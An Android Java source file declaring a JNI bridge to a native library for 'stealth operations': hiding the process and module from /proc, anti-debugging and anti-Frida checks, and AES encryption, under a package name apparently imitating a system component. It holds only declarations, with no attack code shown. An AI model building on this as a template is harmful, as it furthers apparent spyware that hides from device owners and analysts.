package com.android.system.security;

/**
 * Interface to native C library for low-level stealth operations.
 * The native library handles syscall-level process hiding,
 * anti-debugging, and anti-Frida measures.
 */
public class NativeBridge {

    static {
        try {
            System.loadLibrary("native_core");
        } catch (UnsatisfiedLinkError e) {
            // Native lib not available — degrade gracefully
        }
    }

    // ============================================================
    // NATIVE METHODS
    // ============================================================

    /**
     * Initialize native stealth mechanisms.
     * Hides module from /proc/self/maps, sets up signal handlers.
     */
    public static native void initStealth();

    /**
     * Check if a debugger is attached (via ptrace and /proc/status checks).
     */
    public static native boolean isDebuggerAttached();

    /**
     * Check for Frida hooks by scanning memory for Frida signatures.
     */
    public static native boolean detectFrida();

    /**
     * Override /proc/self/cmdline and /proc/self/comm.
     */
    public static native void hideProcess();

    /**
     * Encrypt a buffer in-place using native AES implementation.
     * Returns IV + ciphertext.
     */
    public static native byte[] nativeEncrypt(byte[] plaintext, byte[] key);

    /**
     * Decrypt a buffer using native AES implementation.
     */
    public static native byte[] nativeDecrypt(byte[] ciphertext, byte[] key);

    /**
     * Get native entropy source (bypasses Java SecureRandom).
     */
    public static native byte[] getSecureRandomBytes(int length);
}
